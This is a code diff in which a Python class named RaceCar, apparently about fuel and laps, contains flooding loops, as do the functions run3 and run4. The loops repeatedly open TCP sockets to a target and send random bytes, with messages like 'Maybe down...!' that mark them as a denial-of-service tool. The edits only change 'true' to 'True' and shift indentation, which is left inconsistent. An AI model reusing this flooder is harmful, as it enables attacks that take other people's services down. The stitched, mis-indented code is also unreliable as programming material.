@@ -93,7 +93,7 @@ class RaceCar:
         self.fuel_remaining = self.fuel_remaining - (self.length * 0.125)
         self.laps = self.laps + 1
         data = random._urandom(999)
-	while true:
+	while True:
 		try:
 		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
@@ -106,10 +106,10 @@ class RaceCar:
 		        print("[-] \033[31mError!!!\033[0m")
             
 
-def run3():
-	data = random._urandom(818)
-	while True:
-		try:
+     def run3():
+	 data = random._urandom(818)
+	 while True:
+		 try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
@@ -121,10 +121,10 @@ def run3():
 			print("[-] \033[31mMaybe down...!\033[0m")
             
   
-def run4():
-	data = random._urandom(16)
-	while True:
-		try:
+      def run4():
+	  data = random._urandom(16)
+	  while True:
+		  try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
